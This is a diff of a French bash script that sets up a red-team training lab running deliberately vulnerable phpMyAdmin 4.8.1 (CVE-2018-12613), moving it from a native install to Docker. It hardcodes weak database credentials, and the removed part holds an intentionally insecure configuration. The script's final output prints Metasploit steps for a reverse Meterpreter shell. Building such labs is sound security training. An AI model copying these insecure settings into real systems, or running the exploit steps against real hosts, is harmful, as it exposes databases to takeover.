@@ -1,16 +1,16 @@
 #!/bin/bash
 
 ###############################################################################
-# Iron4Software Red Team Lab - Installation phpMyAdmin 4.8.1 Vulnérable
-# CVE-2018-12613 - Local File Inclusion → Remote Code Execution
+# Iron4Software Red Team Lab - phpMyAdmin 4.8.1 Docker
+# CVE-2018-12613 - LFI → RCE
 # Exploitation: Metasploit exploit/multi/http/phpmyadmin_lfi_rce
 ###############################################################################
 
 set -e
 
 echo "========================================================"
-echo "  Iron4Software Lab - phpMyAdmin 4.8.1 Vulnérable"
-echo "  CVE-2018-12613 - LFI → RCE"
+echo "  Iron4Software Lab - phpMyAdmin 4.8.1 Docker"
+echo "  CVE-2018-12613 (LFI → RCE)"
 echo "========================================================"
 echo ""
 
@@ -19,167 +19,88 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
-WEB_ROOT="/var/www/html"
-PMA_DIR="$WEB_ROOT/phpmyadmin"
-PMA_VERSION="4.8.1"
-PMA_URL="https://files.phpmyadmin.net/phpMyAdmin/${PMA_VERSION}/phpMyAdmin-${PMA_VERSION}-all-languages.tar.gz"
-
-echo "[1/8] Vérification des dépendances..."
-apt update -qq
-apt install -y wget php php-mysql php-mbstring php-zip php-gd php-json php-curl mysql-server > /dev/null 2>&1
-echo "✅ Dépendances installées"
-
-echo "[2/8] Démarrage MySQL..."
-systemctl start mysql
-systemctl enable mysql > /dev/null 2>&1
-echo "✅ MySQL démarré"
-
-echo "[3/8] Configuration MySQL..."
-# Créer un utilisateur MySQL pour phpMyAdmin
-mysql -e "CREATE USER IF NOT EXISTS 'pma'@'localhost' IDENTIFIED BY 'pmapass';" 2>/dev/null || true
-mysql -e "GRANT ALL PRIVILEGES ON *.* TO 'pma'@'localhost' WITH GRANT OPTION;" 2>/dev/null || true
-mysql -e "FLUSH PRIVILEGES;" 2>/dev/null || true
-echo "✅ Utilisateur MySQL créé (pma:pmapass)"
-
-echo "[4/8] Téléchargement phpMyAdmin ${PMA_VERSION}..."
-cd /tmp
-if [ -f "phpMyAdmin-${PMA_VERSION}.tar.gz" ]; then
-    rm -f "phpMyAdmin-${PMA_VERSION}.tar.gz"
-fi
-wget -q "$PMA_URL" -O "phpMyAdmin-${PMA_VERSION}.tar.gz"
-echo "✅ phpMyAdmin téléchargé"
-
-echo "[5/8] Extraction et installation..."
-if [ -d "$PMA_DIR" ]; then
-    echo "⚠️  Suppression de l'ancien phpMyAdmin..."
-    rm -rf "$PMA_DIR"
+echo "[1/6] Vérification de Docker..."
+if ! command -v docker &> /dev/null; then
+    echo "⚠️  Docker non installé, installation..."
+    apt update -qq
+    apt install -y docker.io > /dev/null 2>&1
+    systemctl start docker
+    systemctl enable docker
+    echo "✅ Docker installé"
+else
+    echo "✅ Docker détecté"
+    systemctl start docker 2>/dev/null || true
 fi
 
-tar -xzf "phpMyAdmin-${PMA_VERSION}.tar.gz" -C /tmp/
-mv "/tmp/phpMyAdmin-${PMA_VERSION}-all-languages" "$PMA_DIR"
-echo "✅ phpMyAdmin extrait dans $PMA_DIR"
+echo "[2/6] Vérification de MySQL/MariaDB sur l'hôte..."
+# Détecter MySQL existant pour Roundcube
+if systemctl is-active --quiet mysql || systemctl is-active --quiet mariadb; then
+    echo "✅ MySQL/MariaDB actif (utilisé par Roundcube)"
+    DB_HOST="host.docker.internal"
+elif pgrep -x mysqld > /dev/null || pgrep -x mariadbd > /dev/null; then
+    echo "✅ MySQL/MariaDB détecté en processus"
+    DB_HOST="host.docker.internal"
+else
+    echo "⚠️  Aucun MySQL détecté, création d'un container MySQL..."
+    DB_HOST="mysql_db"
+    
+    # Lancer MySQL dans un container séparé
+    docker run -d \
+        --name mysql_db \
+        --restart unless-stopped \
+        -e MYSQL_ROOT_PASSWORD=rootpass \
+        -e MYSQL_DATABASE=phpmyadmin \
+        -e MYSQL_USER=admin \
+        -e MYSQL_PASSWORD=admin \
+        mysql:5.7 > /dev/null 2>&1 || true
+    
+    echo "✅ MySQL container créé"
+    echo "   Attente démarrage MySQL..."
+    sleep 10
+fi
 
-echo "[6/8] Configuration phpMyAdmin..."
-cd "$PMA_DIR"
-cp config.sample.inc.php config.inc.php
+echo "[3/6] Arrêt du container existant (si présent)..."
+docker stop phpmyadmin-vuln 2>/dev/null || true
+docker rm phpmyadmin-vuln 2>/dev/null || true
+echo "✅ Nettoyage effectué"
 
-# Générer un blowfish secret
-BLOWFISH_SECRET=$(openssl rand -base64 32 | tr -d "=+/" | cut -c1-32)
+echo "[4/6] Lancement phpMyAdmin 4.8.1 vulnérable..."
 
-# Configurer config.inc.php
-cat > config.inc.php << EOF
-<?php
-\$cfg['blowfish_secret'] = '${BLOWFISH_SECRET}';
+# Déterminer le port (8080 par défaut, ou 80 si libre)
+PORT=8080
+if ! netstat -tlnp | grep -q ":80 " 2>/dev/null; then
+    PORT=80
+    echo "   Port 80 libre, utilisation du port 80"
+else
+    echo "   Port 80 occupé, utilisation du port 8080"
+fi
 
-\$i = 0;
-\$i++;
+# Lancer phpMyAdmin 4.8.1
+docker run -d \
+    --name phpmyadmin-vuln \
+    --restart unless-stopped \
+    --add-host=host.docker.internal:host-gateway \
+    -e PMA_HOST="${DB_HOST}" \
+    -e PMA_PORT=3306 \
+    -e PMA_ARBITRARY=1 \
+    -e UPLOAD_LIMIT=300M \
+    -p ${PORT}:80 \
+    phpmyadmin/phpmyadmin:4.8.1
 
-\$cfg['Servers'][\$i]['auth_type'] = 'cookie';
-\$cfg['Servers'][\$i]['host'] = 'localhost';
-\$cfg['Servers'][\$i]['compress'] = false;
-\$cfg['Servers'][\$i]['AllowNoPassword'] = true;
+if [ $? -eq 0 ]; then
+    echo "✅ phpMyAdmin 4.8.1 lancé"
+else
+    echo "❌ Erreur lors du lancement"
+    exit 1
+fi
 
-\$cfg['UploadDir'] = '';
-\$cfg['SaveDir'] = '';
+echo "[5/6] Attente du démarrage (10 secondes)..."
+sleep 10
 
-// VULNERABLE CONFIGURATION - DO NOT USE IN PRODUCTION
-\$cfg['AllowArbitraryServer'] = true;
-?>
-EOF
+echo "[6/6] Vérification..."
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:${PORT}/ 2>/dev/null)
 
-echo "✅ Configuration phpMyAdmin créée"
-
-echo "[7/8] Permissions..."
-mkdir -p "$PMA_DIR/tmp"
-chown -R www-data:www-data "$PMA_DIR"
-chmod -R 755 "$PMA_DIR"
-chmod 777 "$PMA_DIR/tmp"
-echo "✅ Permissions configurées"
-
-echo "[8/8] Création de la page d'information..."
-cat > "$WEB_ROOT/info.html" << 'EOF'
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iron4Software - Infrastructure Info</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            max-width: 800px;
-            margin: 50px auto;
-            background: white;
-            border-radius: 12px;
-            padding: 40px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-        }
-        h1 {
-            color: #2c3e50;
-            border-bottom: 3px solid #667eea;
-            padding-bottom: 15px;
-        }
-        .service {
-            background: #f8f9fa;
-            padding: 20px;
-            margin: 20px 0;
-            border-left: 4px solid #667eea;
-            border-radius: 4px;
-        }
-        a {
-            display: inline-block;
-            margin-top: 10px;
-            padding: 10px 20px;
-            background: #667eea;
-            color: white;
-            text-decoration: none;
-            border-radius: 5px;
-        }
-        a:hover { background: #764ba2; }
-        .warning {
-            background: #ffe6e6;
-            border-left: 4px solid #e74c3c;
-            padding: 15px;
-            margin: 20px 0;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🏢 Iron4Software - Services Internes</h1>
-        
-        <div class="service">
-            <h3>📧 Webmail</h3>
-            <p>Service de messagerie Roundcube pour les employés.</p>
-            <a href="/">Accéder au Webmail</a>
-        </div>
-
-        <div class="service">
-            <h3>🗄️ phpMyAdmin</h3>
-            <p>Interface d'administration des bases de données.</p>
-            <a href="/phpmyadmin/">Accéder à phpMyAdmin</a>
-        </div>
-
-        <div class="warning">
-            <strong>⚠️ Accès Réservé</strong><br>
-            Ces services sont réservés au personnel autorisé d'Iron4Software.
-        </div>
-    </div>
-</body>
-</html>
-EOF
-
-chmod 644 "$WEB_ROOT/info.html"
-echo "✅ Page d'information créée"
-
-# Informations serveur
 SERVER_IP=$(hostname -I | awk '{print $1}')
-HOSTNAME=$(hostname)
 
 echo ""
 echo "========================================================"
@@ -187,65 +108,72 @@ echo "  ✅ Installation terminée avec succès !"
 echo "========================================================"
 echo ""
 echo "📊 Configuration :"
-echo "   Hostname       : $HOSTNAME"
-echo "   IP             : $SERVER_IP"
-echo "   phpMyAdmin     : $PMA_DIR"
-echo "   Version        : $PMA_VERSION"
-echo ""
-echo "🔐 Credentials MySQL :"
-echo "   User           : pma"
-echo "   Password       : pmapass"
-echo "   (ou connexion sans mot de passe activée)"
-echo ""
-echo "🎯 Vulnérabilité :"
+echo "   Container      : phpmyadmin-vuln"
+echo "   Version        : phpMyAdmin 4.8.1 (VULNERABLE)"
 echo "   CVE            : CVE-2018-12613"
-echo "   Type           : Local File Inclusion → RCE"
-echo "   Exploit MSF    : exploit/multi/http/phpmyadmin_lfi_rce"
+echo "   Port           : $PORT"
+echo "   IP Serveur     : $SERVER_IP"
 echo ""
 echo "🌐 URLs d'accès :"
-echo "   Info page      : http://$SERVER_IP/info.html"
-echo "   phpMyAdmin     : http://$SERVER_IP/phpmyadmin/"
-echo "   Webmail        : http://$SERVER_IP/"
+echo "   Local          : http://localhost:${PORT}/"
+echo "   Réseau         : http://${SERVER_IP}:${PORT}/"
+echo "   Depuis Kali    : http://mail.iron4software.local:${PORT}/"
 echo ""
-echo "🧪 Test local :"
-echo "   curl http://localhost/phpmyadmin/"
+echo "🔐 Credentials MySQL :"
+echo "   User: admin"
+echo "   Pass: admin"
+echo "   (ou root / rootpass si MySQL container)"
 echo ""
-
-# Test
-HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost/phpmyadmin/ 2>/dev/null || echo "000")
 
 if [ "$HTTP_CODE" = "200" ]; then
     echo "✅ phpMyAdmin accessible (HTTP 200)"
 else
-    echo "⚠️  phpMyAdmin ne répond pas (HTTP $HTTP_CODE)"
+    echo "⚠️  phpMyAdmin ne répond pas encore (HTTP $HTTP_CODE)"
+    echo "   Attendez 30 secondes et testez: curl http://localhost:${PORT}/"
 fi
 
+echo ""
+echo "🐳 Gestion du container :"
+echo "   Voir logs       : docker logs -f phpmyadmin-vuln"
+echo "   Arrêter         : docker stop phpmyadmin-vuln"
+echo "   Démarrer        : docker start phpmyadmin-vuln"
+echo "   Supprimer       : docker rm -f phpmyadmin-vuln"
+echo "   Recréer         : docker restart phpmyadmin-vuln"
 echo ""
 echo "========================================================"
 echo "  🔥 EXPLOITATION AVEC METASPLOIT"
 echo "========================================================"
 echo ""
-echo "1️⃣  Vérifier l'accès depuis Kali :"
-echo "    curl http://mail.iron4software.local/phpmyadmin/"
+echo "1️⃣  Configurer pfSense Port Forwarding :"
+echo "    Interface: KALI → Port ${PORT} → ${SERVER_IP}:${PORT}"
 echo ""
-echo "2️⃣  Reconnaissance :"
-echo "    nmap -sV -p 80 --script http-enum mail.iron4software.local"
+echo "2️⃣  Tester l'accès depuis Kali :"
+echo "    curl http://mail.iron4software.local:${PORT}/"
 echo ""
 echo "3️⃣  Exploitation Metasploit :"
 echo "    msfconsole -q"
 echo "    use exploit/multi/http/phpmyadmin_lfi_rce"
 echo "    set RHOSTS mail.iron4software.local"
-echo "    set TARGETURI /phpmyadmin/"
+echo "    set RPORT ${PORT}"
+echo "    set TARGETURI /"
+echo "    set USERNAME admin"
+echo "    set PASSWORD admin"
 echo "    set LHOST 192.168.100.10"
 echo "    set LPORT 4444"
 echo "    check"
 echo "    exploit"
 echo ""
-echo "4️⃣  Shell Meterpreter attendu :"
-echo "    meterpreter > sysinfo"
-echo "    meterpreter > getuid"
-echo "    meterpreter > shell"
+echo "4️⃣  Post-Exploitation :"
+echo "    meterpreter> sysinfo"
+echo "    meterpreter> getuid"
+echo "    meterpreter> shell"
 echo ""
 echo "========================================================"
-echo "  🛡️ phpMyAdmin 4.8.1 Vulnérable - Prêt pour Red Team"
+echo "  🐳 phpMyAdmin 4.8.1 Docker - CVE-2018-12613 - PRÊT"
 echo "========================================================"
+echo ""
+echo "📚 Ressources :"
+echo "   CVE-2018-12613  : https://nvd.nist.gov/vuln/detail/CVE-2018-12613"
+echo "   Docker Hub      : https://hub.docker.com/r/phpmyadmin/phpmyadmin"
+echo "   MITRE ATT&CK    : T1190 (Exploit Public-Facing Application)"
+echo ""
